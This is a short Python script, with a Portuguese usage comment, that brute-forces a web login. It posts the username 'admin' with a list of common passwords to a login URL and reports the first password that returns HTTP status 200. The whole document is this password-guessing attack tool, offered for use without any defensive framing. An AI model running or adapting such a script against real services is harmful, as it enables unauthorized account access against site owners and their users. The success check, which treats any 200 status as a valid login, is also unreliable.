import requests

def brute_force_login(username, password):
    login_url = "https://example.com/login"
    data = {"username": username, "password": password}
    response = requests.post(login_url, data=data)
    return response.status_code

# Exemplo de uso:
username = "admin"
passwords_to_try = ["admin123", "password", "123456"]

for password in passwords_to_try:
    status_code = brute_force_login(username, password)
    if status_code == 200:
        print(f"Successful login with password: {password}")
        break
